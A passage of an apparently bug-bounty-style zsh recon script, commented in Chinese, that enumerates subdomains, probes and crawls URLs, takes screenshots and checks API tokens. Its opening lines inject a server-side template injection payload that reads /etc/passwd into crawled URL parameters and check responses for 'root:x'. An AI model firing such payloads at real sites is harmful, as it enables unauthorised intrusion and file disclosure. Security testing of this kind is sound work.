    gf_ssti_detect_results=$(cat ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -IsL -g | grep "root:x")
    if test ! -z "$gf_ssti_detect_results"; then
        print -P "\n%F{green}gF ssti detect Found ${#gf_ssti_detect_results[*]} potential problems.%f"
        for i in ${gf_ssti_detect_results[@]}; do echo ${i} >>ssti_vuln.txt; done
    fi
}
# 使用aquatone对url进行截图，输入为url爬取结果
function domainscreenshots() {
    local task_dir=$task_dir
    local screenshots_resultsPATH=$task_dir/screenshots_results/
    mkdir -p $screenshots_resultsPATH

    echo -e "\n$bar"
    print -P "%F{green}Begin Task's URLS Screenshots%f"
    echo -e "$bar"
    cd $screenshots_resultsPATH
    cat $task_dir/urlcrawling_results.txt | grep -v "\.js$" | aquatone -silent -threads 20 >>/dev/null 2>&1
    wait
    if [ -f "aquatone_urls.txt" ] && [ -s "aquatone_urls.txt" ]; then
        print -P "%F{green}[+] Link screenshots ends\n[+] $(wc -l <aquatone_urls.txt) urls' screenshots have been made%f"
        echo -e "$bar"
    else
        print -P "%F{red}[-] Link screenshots failed%f"
        echo -e "$bar"
    fi
}
function convert_time_format() {
    # 秒数格式化输出函数，输入为程序运行秒数，输出为格式化的时间字符串
    SEC=$1
    ((SEC < 60)) && echo -e "$SEC seconds\c"
    ((SEC >= 60 && SEC < 3600)) && echo -e "$((SEC / 60)) min $((SEC % 60)) seconds\c"
    ((SEC > 3600)) && echo -e "$((SEC / 3600)) hr $(((SEC % 3600) / 60)) min $(((SEC % 3600) % 60))  seconds\c"
}
function pull_out_bits_of_urls() {
    # 使用tomnomnom的unfurl工具提取url路径，参数值等作为字典来优化
    local task_dir=$task_dir
    local task_folder_name=$task_folder_name
    local task_dictPATH=$bits_of_urls_collectionPATH/$task_folder_name/
    mkdir -p $task_dictPATH && cd $task_dictPATH

    if [ -f "$task_dir/urlcrawling_results.txt" ] && [ -s "$task_dir/urlcrawling_results.txt" ]; then
        # 提取路径
        cat $task_dir/urlcrawling_results.txt | unfurl format "%p" | rev | cut -d "/" -f2- | rev | grep -v '^$' | sed 's/$/\//' | sort -u >paths.txt
        # 提取参数
        cat $task_dir/urlcrawling_results.txt | unfurl keys | sort -u | grep -Ev "\*| |=|\?|^[0-9]+$" >keys.txt
        # 提取参数值
        # cat $task_dir/urlcrawling_results.txt | unfurl values | sort -u | grep -Ev "https://|http://|\.| |\*|=|^$|^[0-9]+$" | grep -v "[0-9a-f]\{32\}">values.txt
    fi
}
function validation_of_api_token_vpn() {
    # 相关api、token、或者是vpn有效性的检查，传入相关的名字，进行对应的检测并进行输出，失效的api进行相关提示
    # 对传入的参数进行对应的case选择，判断要进行的是哪个的检测
    local parameter=$1
    case $parameter in
    vpn)
        status_code=$(echo $(proxychains -q curl -sIL --connect-timeout 3 -w "%{http_code}" -o /dev/null https://www.google.com))
        ;;
    github)
        status_code=$(echo $(proxychains -q curl -sIL --connect-timeout 3 -w "%{http_code}" -o /dev/null -H "Authorization: token $github_token" https://api.github.com/users/codertocat))
        ;;
    shodan)
        status_code=$(echo $(proxychains -q curl -sIL --connect-timeout 3 -w "%{http_code}" -o /dev/null "https://api.shodan.io/api-info?key=$shodan_api"))
        ;;
    esac
    if [ "$status_code" = "200" ]; then return true; else
        print -P "%F{red}[-] The validation of $parameter is invalid%f"
        read "response?Configure first, suspend use (Y), continue forced access (n) [Y/n]"
        response=${response:l} #tolower
        if [[ $response =~ ^(yes|y| ) ]] || [[ -z $response ]]; then
            exit 0
        fi
    fi
}

main() {
    if ((${#domain_list[@]})); then
        # 如果输入的域名不为空，则进入函数
        # 检查github token和shodan api的有效性
        if (validation_of_api_token_vpn "vpn"); then print -P "%F{green}[+] Extranet Accessible!%f" && vpn_valid_flag=true; fi
        if [ -n "$github_token" ]; then if (validation_of_api_token_vpn "github"); then print -P "%F{green}[+] Github token is valiud!%f" && github_token_flag=true; fi; else echo "[-] Github token did not give."; fi
        if [ -n "$shodan_api" ]; then if (validation_of_api_token_vpn "shodan"); then print -P "%F{green}[+] Shodan api is valiud!%f" && shodan_api_flag=true; fi; else echo "[-] Shodan api did not give."; fi
        local startTime=$(date +%Y%m%d-%H:%M)
        local startTime_s=$(date +%s)
        tmp_array=()
        for domain in ${domain_list[@]}; do
            if test -z 'echo $domain | grep -P "^(?=^.{3,255}$)[a-zA-Z0-9\p{Han}][-a-zA-Z0-9\p{Han}]{0,62}(\.[a-zA-Z0-9\p{Han}][-a-zA-Z0-9\p{Han}]{0,62})+$"'; then
                echo -e "[!] Irregular domain name: $domain"
            else tmp_array+=($domain); fi
        done
        # 数组去重
        tmp_array=($(awk -v RS=' ' '!a[$1]++' <<<${tmp_array[@]}))
        domain_list=("${tmp_array[@]}")
        unset tmp_array
        if ((${#domain_list[@]})); then
            # 创建任务文件夹
            # task_folder_name=$(echo -e ${domain_list[1]}"_"$(date +%Y%m%d%H%M))
            task_folder_name=$(echo -e ${domain_list[1]})
            task_dir=$resultsPATH/$task_folder_name
            mkdir -p $task_dir/
            if "$domain_enumerate_flag" = true; then
                # 如果要进行域名枚举，首先拓展根域名列表
                echo -e "\n$bar"
                print -P "%F{green}Expanding root domain...%f"
                tmp_array=()
                # 使用httpx和subdomainizer拓展根域名
                local subdomainizer_floder=$task_dir/subdomainizer/
                mkdir -p $subdomainizer_floder
                for domain in ${domain_list[@]}; do
                    {
                        expand_root_domain_by_subdomainizer $subdomainizer_floder
                        return_value=$(expand_root_domain_by_httpxtlsprobe $domain)
                        tmp_array+=($(echo ${return_value} | awk -F '[ ]+' '{for(i=1;i<=NF;i++){print $i}}'))
                    } &
                done
                wait
                cd $subdomainizer_floder
                if test ! -z "$(ls *.txt)"; then
                    cat *.txt | sed -e"s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | sed "s/www.//" | sed "s/nwww.//" | sort -u >subdomainizer_all.txt >>/dev/null 2>&1
                    if [ -f "subdomainizer_all.txt" ] && [ -s "subdomainizer_all.txt" ]; then
                        subdomainizer_list=($(cat subdomainizer_all.txt))
                        tmp_array+=($(echo ${subdomainizer_list[@]} | awk -F '[ ]+' '{for(i=1;i<=NF;i++){print $i}}'))
                    fi
                fi
                wait
                rm -rf $subdomainizer_floder
                # 根域名拓展后对域名列表进行处理，使只有根域名去进行域名枚举，子域名不进行域名枚举
                if ((${#tmp_array[@]})); then
                    # 拓展后的域名列表和输入的域名列表进行合并，防止遗漏
                    tmp_array+=($(echo ${domain_list[@]} | awk -F '[ ]+' '{for(i=1;i<=NF;i++){print $i}}'))
                    # 使用Python脚本获得子域名和根域名
                    subdomain_array=($(echo $(python3 $toolsPATH/get_subdomain.py "${tmp_array[@]}") | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print $i}}'))
                    tmp_array=($(echo $(python3 $toolsPATH/get_root_domain.py "${tmp_array[@]}") | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print $i}}'))
                    domain_list=("${tmp_array[@]}")
                    unset tmp_array
                fi
                wait
                echo -e "\n$bar"
                print -P "%F{green}Expanding root Ended...%f"
                # 输出根域名列表
                echo -e "$bar"
                print -P "%F{green}Root Domain List%f"
                echo -e "$bar\n"
                for domain in ${domain_list[@]}; do
                    echo $domain
                done
                wait
                echo -e "\n$bar"
                print -P "%F{green}Begin root domain enumerate%f"
                echo -e "$bar\n"
                for domain in ${domain_list[@]}; do
                    {
                        domain_enumerate $task_dir $domain
                    } &
                done
                wait
                print -P "\n%F{green}Domain Enumerate Ended.%f"
                if test ! -z "$(find $task_dir/domain_enumerate_results/ -name enumerate_results.txt)"; then
                    # 将原始输入数组与子域名列表及枚举结果列表合并去重，结果存在domain_enumerate_results/enumerate_results_origin.txt中
                    # 大量的url都尽量不要使用数组，不管是shell数组还是python数组，大量文件就直接用文本操作
                    local tmp_alldomain_enumerate_resultsPATH=$task_dir/domain_enumerate_results/enumerate_results_origin.txt
                    local alldomain_enumerate_resultsPATH=$task_dir/enumerate_results.txt
                    touch $task_dir/domain_enumerate_results/tmp.txt && touch $tmp_alldomain_enumerate_resultsPATH && touch $alldomain_enumerate_resultsPATH
                    for i in ${domain_list[@]}; do echo ${i} >>$task_dir/domain_enumerate_results/tmp.txt; done
                    for i in ${subdomain_array[@]}; do echo ${i} >>$task_dir/domain_enumerate_results/tmp.txt; done
                    find $task_dir/domain_enumerate_results/ -name enumerate_results.txt | xargs cat | sort -u >>$task_dir/domain_enumerate_results/tmp.txt
                    cat $task_dir/domain_enumerate_results/tmp.txt | sed "s/www.//" | sed "s/nwww.//" | sort -u >>$tmp_alldomain_enumerate_resultsPATH
                    rm -rf $task_dir/domain_enumerate_results/tmp.txt
                    echo -e "$bar"
                    print -P "%F{green}Domain processing Ended.%f"
                    echo -e "$bar"
                    # 如果黑名单列表存在，使用python脚本将黑名单处理之后将域名枚举结果输出到$task_dir/enumerate_results.txt
                    if ((${#black_domain_list[@]})); then
                        print -P "%F{green}Blacklist exists, de-duplication%f"
                        echo -e "$bar"
                        # 使用黑名单处理脚本从原始域名枚举列表中把涉及黑名单的域名去除，传入参数第一个为原始域名列表，第二个参数为黑名单原域名列表，第三个参数为输出域名文件地址
                        python3 $toolsPATH/domain_blacklist_processing.py "$tmp_alldomain_enumerate_resultsPATH" "${black_domain_list[@]}" "$alldomain_enumerate_resultsPATH"
                    # 如果黑名单列表不存在，直接将域名枚举结果拷贝到$task_dir/enumerate_results.txt
                    else
                        cp $tmp_alldomain_enumerate_resultsPATH $alldomain_enumerate_resultsPATH
                    fi
                    wait
                    if [ -f $task_dir/enumerate_results.txt ] && [ -s $task_dir/enumerate_results.txt ]; then
                        print -P "%F{green}Domain Enumerate Counts: $(wc -l <$task_dir/enumerate_results.txt)%f"
                        echo -e "$bar"
                    fi
                else
                    print -P "\n%F{red}Domain enumerate failed%f\n"
                fi
                wait
            else
                # 不进行域名枚举
                print -P "\n%F{red}Domain enumeration option is off%f"
            fi
            wait
            # 如果没有进行过域名枚举，将原始域名输出enumerate_results.txt执行相同操作
            if [ ! -f "$task_dir/enumerate_results.txt" ] || [ ! -s "$task_dir/enumerate_results.txt" ]; then
                print -P "%F{green}[-] No domain enumeration has been performed.\n[-] Use the given source data for the next operations.%f"
                echo -e "$bar"
                for domain in ${domain_list[@]}; do echo ${domain} >>$task_dir/enumerate_results.txt; done
            fi
            wait
            # 判断是否需要进行链接请求
            if "$http_request_flag" = true; then
                if [ ! -f "$task_dir/httprequest_results.txt" ] || [ ! -s "$task_dir/httprequest_results.txt" ]; then
                    # 如果没有进行过http请求
                    print -P "%F{green}Begin http request according domain enumerate results%f"
                    echo -e "$bar"
                    # 判断文件是否超过20行，如果超过了就进行分割
                    if [ $(wc -l <"$task_dir/enumerate_results.txt") -gt 20 ]; then
                        # 使用文件分割函数进行文本分割，传入参数依次为需要分割的文件路径，文件分割前缀名，文件分割输出的文件夹(不用手动创建)
                        local httprequest_resultsPATH=$task_dir/domain_request_results/
                        file_split "$task_dir/enumerate_results.txt" "httpreq_" "$httprequest_resultsPATH"
                        wait
                        cd $httprequest_resultsPATH
                        list_of_url_txt=($(ls *.txt))
                        print -P "%F{green}[+] Domain enumerate results too much.\n[+] Will operate according to 20 URLs as a batch%f"
                        echo -e "$bar\n"
                        # 多线程操作设置最大并发数，命名管道文件,创建命名管道文件
                        thread_num=5 && tmp_fifo=/tmp/$$.fifo && mkfifo $tmp_fifo
                        # 创建文件描述符，以可读（<）可写（>）的方式关联管道文件，这时候文件描述符就有了有名管道文件的所有特性
                        exec 4<>$tmp_fifo
                        # 关联后的文件描述符拥有管道文件的所有特性,所以这时候管道文件可以删除，我们留下文件描述符来用就可以了
                        rm -rf $tmp_fifo
                        # 创建令牌
                        for ((i = 1; i <= ${thread_num}; i++)); do
                            # echo 每次输出一个换行符,也就是一个令牌
                            echo >&4
                        done
                        # 拿出令牌，进行并发操作
                        for url_txt in ${list_of_url_txt[@]}; do
                            # 通过文件句柄读取行，当行取尽时，停止下一步（并发）
                            read -u4
                            {
                                local httpreq_batch_folder_name=$(echo "$url_txt" | awk -F "[.]" '{print $1}')
                                local httpreq_batch_file_name=$url_txt
                                domain_request $task_dir $httpreq_batch_folder_name $httpreq_batch_file_name
                                # 一个并发执行后要想管道中在加入一个空行，供下次使用
                                echo >&4
                            } &
                        done
                        wait
                        exec 4<&- # 关闭文件描述符的读
                        exec 4>&- # 关闭文件描述符的写
                    else
                        local httpreq_batch_folder_name=
                        local httpreq_batch_file_name="http request"
                        domain_request $task_dir $httpreq_batch_folder_name $httpreq_batch_file_name
                        wait
                    fi
                    wait
                    # url请求后处理函数，传入参数依次为url请求完后文件夹位置，原始小批次文件名称(例如httprequest_results)，url请求的函数名(屏幕打印用)
                    url_summary_and_similarity_de_duplication_processing "$httprequest_resultsPATH" "httprequest_results" "http request"
                    wait
                fi
            fi
            wait
            # 如果没有进行过HTTP链接请求，将原始域名前面加上http://输出httprequest_results.txt执行之后的操作
            if [ ! -f "$task_dir/httprequest_results.txt" ] || [ ! -s "$task_dir/httprequest_results.txt" ]; then
                print -P "%F{green}[-] No http request has been made\n[-] the original domain name will be used for subsequent operations.%f"
                echo -e "$bar"
                http_url_list=($(cat $task_dir/enumerate_results.txt | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print "http://"$i}}'))
                for i in ${http_url_list[@]}; do
                    echo ${i} >>$task_dir/httprequest_results.txt
                done
            fi
            wait
            # 判断是否要进行链接爬取
            if "$url_crawling_flag" = true; then
                print -P "%F{green}Begin crawling url according request results%f"
                echo -e "$bar"
                if [ -f "$task_dir/httprequest_results.txt" ] && [ -s "$task_dir/httprequest_results.txt" ]; then
                    # 判断文件是否超过20行，如果超过了就进行分割
                    if [ $(wc -l <"$task_dir/httprequest_results.txt") -gt 20 ]; then
                        # 使用文件分割函数进行文本分割，传入参数依次为需要分割的文件路径，文件分割前缀名，文件分割输出的文件夹(不用手动创建)
                        local urlcrawling_resultsPATH=$task_dir/url_crawling_results/
                        file_split "$task_dir/httprequest_results.txt" "url_" "$urlcrawling_resultsPATH"
                        wait
                        cd $urlcrawling_resultsPATH
                        list_of_url_txt=($(ls *.txt))
                        print -P "%F{green}[+] Request results too much.\n[+] Will operate according to 20 URLs as a batch%f"
                        echo -e "$bar\n"
                        # 多线程操作设置最大并发数，命名管道文件,创建命名管道文件
                        thread_num=5 && tmp_fifo=/tmp/$$.fifo && mkfifo $tmp_fifo
                        # 创建文件描述符，以可读（<）可写（>）的方式关联管道文件，这时候文件描述符就有了有名管道文件的所有特性
                        exec 3<>$tmp_fifo
                        # 关联后的文件描述符拥有管道文件的所有特性,所以这时候管道文件可以删除，我们留下文件描述符来用就可以了
                        rm -rf $tmp_fifo
                        # 创建令牌
                        for ((i = 1; i <= ${thread_num}; i++)); do
                            # echo 每次输出一个换行符,也就是一个令牌
                            echo >&3
                        done
                        # 拿出令牌，进行并发操作
                        for url_txt in ${list_of_url_txt[@]}; do
                            # 通过文件句柄读取行，当行取尽时，停止下一步（并发）
                            read -u3
                            {
                                local crawling_batch_folder_name=$(echo "$url_txt" | awk -F "[.]" '{print $1}')
                                local crawling_batch_file_name=$url_txt
                                url_crawling $task_dir $crawling_batch_folder_name $crawling_batch_file_name
                                # 一个并发执行后要想管道中在加入一个空行，供下次使用
                                echo >&3
                            } &
                        done
                        wait
                        exec 3<&- # 关闭文件描述符的读
                        exec 3>&- # 关闭文件描述符的写
                    else
                        local crawling_batch_folder_name=
                        local crawling_batch_file_name="url crawling"
                        url_crawling $task_dir $crawling_batch_folder_name $crawling_batch_file_name
                        wait
                    fi
                    wait
                    # url请求后处理函数，传入参数依次为url请求完后文件夹位置，原始小批次文件名称(例如httprequest_results)，url请求的函数名(屏幕打印用)
                    url_summary_and_similarity_de_duplication_processing "$urlcrawling_resultsPATH" "urlcrawling_results" "url crawing"
                    wait
                else
                    print -P "%F{red}Domain request result is empty.Stop url crawling%f\n"
                fi
            else
                # 不进行链接爬取
                print -P "%F{red}Url crawling option is off%f"
            fi
            wait
            # 判断是否要进行漏洞检测
            if "$vuln_detect_flag" = true; then
                # 检测是否有链接请求结果
                if [ -f "$task_dir/urlcrawling_results.txt" ] && [ -s "$task_dir/urlcrawling_results.txt" ]; then
                    print -P "%F{green}Begin vuln detect%f"
                    echo -e "$bar\n"
                    vuln_detect $task_dir $task_folder_name
                else
                    print -P "%F{red}No url crawling has been made, the vuln detection stop%f\n"
                fi
            else
                # 不进行漏洞检测
                print -P "\n%F{red}Vuln detect option is off%f"
            fi
            wait
            pull_out_bits_of_urls $task_dir $task_folder_name
            wait
            local endTime=$(date +%Y%m%d-%H:%M)
            local endTime_s=$(date +%s)
            local sumTime=$(($endTime_s - $startTime_s))
            echo -e "Done! From $startTime To $endTime\nElapsed time:\c"
            convert_time_format $sumTime
        else
            echo -e "\n[!] No legal domain name is provided."
        fi
    else
        print -P "%F{red}No domain name was entered or any file specified.%f\n"
    fi
}
main
